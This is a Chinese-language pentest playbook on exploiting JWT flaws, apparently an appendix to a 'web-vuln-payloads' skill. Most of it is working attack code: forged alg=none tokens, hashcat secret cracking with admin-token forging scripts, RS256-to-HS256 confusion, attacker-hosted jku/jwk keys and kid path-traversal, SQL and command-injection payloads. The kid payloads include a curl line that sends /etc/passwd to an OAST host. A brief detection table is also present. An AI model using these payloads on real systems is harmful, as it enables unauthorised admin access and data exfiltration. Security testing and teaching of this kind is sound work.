# JWT 攻击全表：六类缺陷的手工利用与验伤

> 被 `web-vuln-payloads` 引用。判据只有一条：**换一个你没有的权限，用改过的 token 请求成功了**。
> 不是"解码看到了 admin 字段"，也不是"jwt_tool 说 vulnerable"。
>
> 为什么单独成文：技能正文的 JWT 只有 4 行伪代码（alg=none / 弱密钥 / RS→HS / kid），
> 没有一条完整命令。而 JWT 是 API 测试里最高频的一块——几乎每个现代系统都发 token，
> 而且实现错误率极高（OWASP 2023 统计：JWT 相关缺陷在 API 漏洞里排前三）。
>
> 本文每条都带「怎么判 → 完整命令 → 验伤 → 假成功反例」。**先判再打**，
> 不要一上来就跑 jwt_tool 全扫（它会把所有攻击面都试一遍，噪音大且容易被 WAF 拦）。

## 〇、第一步：把 token 拆开看清（永远先做这个）

```bash
TOKEN="eyJhbGciOi..."
# 拆三段看清楚（不解码你根本不知道该打哪条）
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | cut -d. -f3 | wc -c   # 签名段长度（0 = 本来就没签名）
```

**必须从 header + payload 里读出这六个信息，缺一个就可能白打**：

| 要看的 | 在哪 | 决定什么 |
| --- | --- | --- |
| `alg` | header | 打哪条路（HS256→弱密钥；RS256→RS/HS 混淆；none→直接改） |
| `kid` | header | 有没有 kid 注入（路径穿越 / SQL / 命令） |
| `jku` / `jwk` / `x5u` | header | 有没有外部密钥源劫持（**命中率极高**） |
| 角色/权限字段 | payload | 改哪个字段能升权（`role`/`admin`/`scope`/`groups`/`is_admin`） |
| `exp` / `iat` | payload | 过期时间（改完要不要同步改 exp） |
| 是否有 `nonce`/`jti` | payload | 有没有防重放（有则重放类攻击失效） |

**判据**：`alg` 是 `RS256` 时，说明服务端用**公钥验签**——那么"公钥能不能拿到"直接决定
能不能打 RS→HS。先看 `.well-known/jwks.json`、`/jwks`、登录页的 JS 里有没有公钥。

## 一、alg=none（最老、最少见，但先试一次成本极低）

### 怎么判

有些库在解析时如果 `alg=none` 就不验签（历史缺陷，RFC 明确禁止但实现常犯）。
成本 10 秒，先试。

### 完整命令

```bash
# 手工构造：把 header 改成 {"alg":"none","typ":"JWT"}，签名段留空
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)          # 保留原 payload
FORGED="$HEADER.$PAYLOAD."                       # 注意末尾的点，签名段为空

curl -s -H "Authorization: Bearer $FORGED" https://target/api/me

# 变体：alg 写成 None / NONE / nOnE（有些实现只做大小写不敏感匹配）
```

### 验伤

```bash
# 拿一个权限更高的账密都没配的字段，看返回是否变了
# 对比：原 token 请求 → {"role":"user"}；伪 token 请求 → {"role":"admin"} 才算成功
```

### 假成功反例

- 改了 header 但**忘了把 payload 里的签名校验字段一起改** → 返回 401。JWT 的 payload 是
  明文 base64，你可以任意改，但**服务端可能还查数据库**（`sub` 对应的用户是否真存在）。
- 返回 200 但 body 是 `{"error":"invalid token"}` → 有些框架用 200 包错误，**看 body 不看状态码**。

## 二、弱密钥爆破（HS256，命中率最高的一条）

### 怎么判

`alg=HS256` 且是 HMAC。签名 = `HMAC-SHA256(secret, header.payload)`。
如果 secret 是弱口令（`secret`、`changeme`、`your-256-bit-secret`、公司名、`jwt_secret`），
就能离线爆破出来，然后**任意伪造**。

### 完整命令

```bash
# 1) 字典 + jwt 专用规则（jwt.secrets.list 是 jwt_tool 自带的常见密钥表）
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt -O
# 16500 = JWT (HS256)。HS384/HS512 用 16550/17500

# 或 john
john --format=HMAC-SHA256 token.txt --wordlist=rockyou.txt

# 2) 拿到密钥后伪造（改成 admin）
python3 - <<'EOF'
import hmac, hashlib, base64, json
secret = b"<爆出来的密钥>"
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=")
header  = b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
payload = b64(json.dumps({"sub":"1","role":"admin","exp":9999999999},separators=(",",":")).encode())
sig = b64(hmac.new(secret, header+b"."+payload, hashlib.sha256).digest())
print((header+b"."+payload+b"."+sig).decode())
EOF
```

### 验伤

```bash
FORGED=$(上面输出的 token)
curl -s -H "Authorization: Bearer $FORGED" https://target/api/admin/users
# 返回真实数据（不是 401/403）才算成功
```

### 假成功反例（这条最容易骗人）

- **爆出来了但伪造的 token 被拒** → 服务端还校验了 `sub` 对应用户的**当前权限**
  （很多框架每次请求查库），改 `role` 无效。此时要改的是 `sub`（换成已知管理员的 id）。
- **爆出来的密钥是 `secret` 但 hashcat 报 "Exhausted"** → 说明同一 token 有多条
  （比如 `token.txt` 里有换行/空格），先 `cat -A` 检查。

## 三、RS256 → HS256 混淆（最经典、最需要条件）

### 怎么判

服务器用 `RS256`（**公钥验签**）。如果实现是「按 header 里的 `alg` 选验签算法」，
则把 `alg` 改成 `HS256` 后，库里会用**公钥字符串当 HMAC 密钥**验签。
攻击者知道公钥 → 自己用公钥当 secret 签名 → 通过。

**前提：你必须拿到公钥原文**。拿不到就打不了（这是前提不是障碍）。

### 完整命令

```bash
# 1) 找公钥：三个常见位置
curl -s https://target/.well-known/jwks.json | jq .                 # JWKS（需提取 n/e 拼 PEM）
curl -s https://target/jwks.json | jq .
curl -s https://target/ | grep -oE 'BEGIN PUBLIC KEY[^"]*'          # 页面泄漏

# 2) JWKS 转 PEM（n/e → 公钥）
python3 - <<'EOF'
import json, base64
from Crypto.PublicKey import RSA
j = json.load(open("jwks.json"))["keys"][0]
n = int.from_bytes(base64.urlsafe_b64decode(j["n"] + "=="), "big")
e = int.from_bytes(base64.urlsafe_b64decode(j["e"] + "=="), "big")
print(RSA.construct((n, e)).export_key().decode())
EOF

# 3) 用公钥当 HMAC 密钥签（注意必须是**原始 PEM 字节**，含换行和尾部换行）
python3 - <<'EOF'
import hmac, hashlib, base64, json
pub = open("public.pem","rb").read()      # 含 -----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----\n
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=")
h = b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
p = b64(json.dumps({"sub":"admin","role":"admin","exp":9999999999},separators=(",",":")).encode())
s = b64(hmac.new(pub, h+b"."+p, hashlib.sha256).digest())
print((h+b"."+p+b"."+s).decode())
EOF
```

### 假成功反例（这是本类最常见的失败原因）

- **公钥的字节不对**：PEM 里的换行、尾部 `/n`、或者你去掉了 `-----BEGIN-----` 行
  → 签名永远对不上，但你会以为是"服务端修了这个洞"。**必须逐字节用文件内容，不要手抄**。
- **服务端把 `alg` 白名单固定成 RS256** → 直接拒（这是正确实现），换下一类。
- **JWKS 的 `n`/`e` 解码 padding 错了** → `base64.urlsafe_b64decode` 要补 `==` 到 4 的倍数。

## 四、jku / jwk / x5u 头注入（命中率极高、最容易被忽略）

### 怎么判

header 里允许 `jku`（JWKS URL）、`jwk`（内嵌公钥）、`x5u`（证书 URL）时，
服务端可能**从你给的 URL 取公钥验签**。若没做白名单 → 你放一个自己的 JWKS，
服务端会用它验你伪造的 token。

**这是最值得先试的一条**：不需要爆破、不需要公钥、不需要算法混淆，只要一个能放文件的域名。

### 完整命令

```bash
# 1) 先判：把 jku 改成你自己的地址，看服务端有没有去请求（用 OAST 观察回连）
python3 - <<'EOF'
import json, base64
h = {"alg":"RS256","typ":"JWT","jku":"https://YOUR-OAST.oast.fun/jwks.json"}
print(base64.urlsafe_b64encode(json.dumps(h,separators=(",",":")).encode()).rstrip(b"=").decode())
EOF

# 2) 在自己的域名放 JWKS（用 openssl 生成密钥对，导出 JWKS）
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
python3 - <<'EOF'
import json, base64
from Crypto.PublicKey import RSA
k = RSA.import_key(open("pub.pem").read())
def b64u(i):
    b = i.to_bytes((i.bit_length()+7)//8, "big")
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
open("jwks.json","w").write(json.dumps({"keys":[{"kty":"RSA","n":b64u(k.n),"e":b64u(k.e),"kid":"attacker"}]}))
EOF

# 3) 用私钥签伪造 token，jku 指向你的地址
#    （同上，但 alg=RS256 + 用 priv.pem 签 + header 带 jku）

# 4) 变体：jwk 内嵌（连域名都不要，把公钥直接塞 header）
#    header: {"alg":"RS256","jwk":{...你生成的公钥...}}
```

### 验伤

**两段式验伤**（必须两段都中才算成立）：
1. **OAST 收到回连** → 说明服务端真的去取了你给的 URL（证明 jku 生效）；
2. **伪造 token 被接受** → 返回真实数据（证明它用了你的公钥验签）。

只有 1 没有 2 → 服务端取了 URL 但做了白名单校验（或取了但没用）。

### 假成功反例

- OAST 有回连就宣布成功 → 那只证明"SSRF 存在"，不代表 JWT 被绕过。
- `jku` 处的 URL 必须能被服务端访问（内网服务访问不了公网时，改指向目标自己可控的路径）。

## 五、kid 注入（路径穿越 / SQL / 命令）

### 怎么判

`kid`（key id）是 header 里的自由字符串，服务端用它去**查密钥**。如果实现是：

```javascript
const key = fs.readFileSync(`/keys/${kid}.pem`)          // 路径穿越
const key = db.query(`SELECT key FROM keys WHERE id='${kid}'`)  // SQL 注入
const key = execSync(`cat /keys/${kid}`)                  // 命令注入
```

就有三条路可打。

### 完整命令

```bash
# 路径穿越：让服务端把 /dev/null 当密钥（空字节 → HMAC 密钥为空 → 你能签）
# header: {"alg":"HS256","kid":"../../../../dev/null"}
# 用空密钥签名（Python 里 secret=b""）
python3 - <<'EOF'
import hmac, hashlib, base64, json
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=")
h = b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"},separators=(",",":")).encode())
p = b64(json.dumps({"sub":"admin","role":"admin","exp":9999999999},separators=(",",":")).encode())
s = b64(hmac.new(b"", h+b"."+p, hashlib.sha256).digest())     # 空密钥
print((h+b"."+p+b"."+s).decode())
EOF

# SQL 注入：kid 里塞 union，让查询返回你知道的密钥
# kid: "x' UNION SELECT 'knownsecret' -- "
# 然后用 'knownsecret' 当 HMAC 密钥签（同上，secret=b"knownsecret"）

# 命令注入：kid 里塞管道（少见，需实现用了 shell）
# kid: "x; curl http://OAST/$(cat /etc/passwd | base64 -w0)"
```

### 验伤

同上：伪造 token 请求返回真实数据。**路径穿越这条要先确认服务端真读了文件**
（用 `/etc/passwd` 之类做二次确认，比 /dev/null 更能证明穿越成立）。

### 假成功反例

- `kid` 注入进去了但服务端**用了 prepared statement**（SQL 注入无效）→ 换路径穿越。
- 路径穿越成功但目标文件存在且非空 → 密钥不是你控制的，签不出来（要选 `/dev/null`
  或你知道内容且可写的文件）。

## 六、算法降级以外的逻辑缺陷（不属密码学，但最常见）

### 6.1 权限字段直接信任（最高命中率，别跳过）

**很多系统的 JWT 里带 `role` / `scope` / `groups`，且服务端只验签不查库。**
这种情况下不需要任何密码学攻击——只要拿到"签名合法"的 token（你自己的账号），
**改 payload 后重新签名（用自己的密钥？不行）**……

等等，这条要分清：

| 情况 | 能否改 payload | 怎么打 |
| --- | --- | --- |
| 服务端验签 + 不查库 | **不能**改（签名会失效） | 必须先破签名（上面五类），或找到签名侧漏洞 |
| 服务端验签 + 查库 | 不能改 | 改 `sub` 换成管理员 id（**这时改 sub 有用，改 role 没用**） |
| **服务端不验签**（只 base64 解码） | **能直接改** | 改完直接用，无需密钥 |
| 服务端只校验 exp/payload 部分字段 | 视实现 | 逐个字段试 |

**先测第三行**（10 秒就能判）：

```bash
# 把 payload 改成 admin，签名段随便写，直接请求
# 若返回 200 + 管理员数据 → 服务端根本没验签（严重缺陷，直接报）
```

### 6.2 过期校验缺失 / 时间字段可绕

```bash
# 造一个已过期的 token（exp = 过去），看是否仍被接受
# 或把 exp 删掉完全（有些实现 exp 缺失时跳过校验）
```

### 6.3 JWKS 密钥轮换漏洞

```bash
# 服务端支持多 kid（轮换期），旧 kid 的密钥可能还能用
# → 找到历史 kid（响应头、错误信息、GitHub 泄漏），用旧密钥签（旧密钥常是公开的/弱的）
```

## 七、检测视角

| 攻击 | 服务端日志信号 | 说明 |
| --- | --- | --- |
| alg=none | 验签失败日志（但实现若真跳过验签则无日志） | 几乎无痕 |
| 弱密钥爆破 | **离线**，服务端无日志 | 完全无痕（这是它最大的优势） |
| RS→HS | 验签失败（若实现正确）；无失败（若实现有缺陷） | 取决于实现 |
| jku 注入 | 服务端出站请求到你给的 URL（代理/DNS 日志） | **有痕**（出站异常） |
| kid 注入 | 文件读取异常 / SQL 错误 / 命令执行 | 有痕（错误日志） |
| 不验签 | 无 | 无痕 |

## 八、常见坑

1. **base64url 与 base64 混用**：JWT 用 base64url（`-` `_`，无 `=`）。用 `base64 -d`
   解码常失败，要 `tr '+/' '-_' | tr -d '='` 后再补 padding。
2. **PEM 字节必须逐字节**：RS→HS 失败 90% 是因为公钥里的换行/尾部空格被改了。
3. **`alg` 大小写**：有些实现做 `alg.toLowerCase() === "none"`，所以 `None`/`NONE` 都要试。
4. **改 payload 后忘了改 `exp`**：原 token 快过期时，伪造的也要给未来的 exp。
5. **jku 指向的 URL 必须服务端可达**：内网服务访问不了公网 → 用目标自己能访问的地址。
6. **别只测一个接口**：同一套 JWT 在不同接口的校验强度不同（`/api/me` 验签、`/api/admin` 不验）。
7. **jwt_tool 全扫会被 WAF 拦**：它一次发几十个变体。手工按上面顺序试，每次只改一处。
8. **`kid` 注入要先确认服务端真用了 kid**（有些实现收下了但忽略）——拿掉 kid 看是否仍通过。